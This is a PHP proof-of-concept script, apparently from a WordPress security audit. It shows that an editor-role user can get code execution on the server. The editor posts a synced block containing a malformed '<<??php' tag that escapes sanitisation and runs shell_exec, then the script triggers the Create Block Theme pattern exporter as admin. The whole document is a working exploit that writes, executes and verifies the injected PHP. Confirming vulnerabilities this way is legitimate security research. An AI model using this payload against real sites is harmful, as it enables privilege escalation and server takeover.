<?php
error_reporting(E_ERROR|E_PARSE);
function out($k,$v){ echo $k.': '.$v."\n"; }
$M='/home/user/wpaudit/CBT_EDITOR_RCE.txt'; @unlink($M);
$dir = get_stylesheet_directory().'/patterns';
$target = $dir.'/cbt-real.php'; @unlink($target);
// EDITOR plants the synced pattern via the normal REST endpoint.
$ed = get_user_by('login','editor'); wp_set_current_user($ed->ID); kses_init();
$payload = '<<??php file_put_contents("'.$M.'","RCE uid=".trim(shell_exec("id -u"))); ?>';
$req = new WP_REST_Request('POST','/wp/v2/blocks');
$req->set_param('title','cbt-real'); $req->set_param('status','publish'); $req->set_param('content',$payload);
$bid = rest_do_request($req)->get_data()['id'] ?? 0;
out('editor_block_id',$bid);
// ADMIN runs the REAL exporter entry point.
$ad = get_user_by('login','admin'); wp_set_current_user($ad->ID); kses_init();
CBT_Theme_Patterns::add_patterns_to_theme();
out('file_created', file_exists($target)?'YES':'no');
if (file_exists($target)) {
  $c = file_get_contents($target);
  out('has_live_php_tag', preg_match('/\?>\s*<\?php\s+file_put_contents/',$c)?'*** YES ***':'no');
  require $target; clearstatcache();
  out('RCE_VIA_REAL_EXPORT', file_exists($M)?('*** '.trim(file_get_contents($M)).' ***'):'no');
}
@unlink($M); @unlink($target); wp_delete_post($bid,true);
